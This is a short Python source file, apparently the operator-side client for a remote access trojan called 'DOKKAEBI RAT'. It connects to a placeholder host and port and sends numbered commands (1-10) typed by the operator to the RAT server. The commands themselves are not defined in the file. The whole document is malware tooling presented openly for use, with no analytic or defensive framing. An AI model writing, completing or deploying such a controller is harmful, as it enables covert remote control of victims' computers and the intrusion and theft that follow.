import socket

HOST = 'changeme'
PORT = changeme

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((HOST, PORT))
            print("Connected to DOKKAEBI RAT Server")
            while True:
                command = input("Enter command (1-10): ")
                if command.lower() == 'exit':
                    break
                try:
                    command = int(command)
                    if 1 <= command <= 10:
                        s.sendall(str(command).encode('utf-8'))
                    else:
                        print("Invalid command.")
                except ValueError:
                    print("Invalid command format.")
        except Exception as e:
            print(f"Connection error: {e}")

if __name__ == "__main__":
    main()
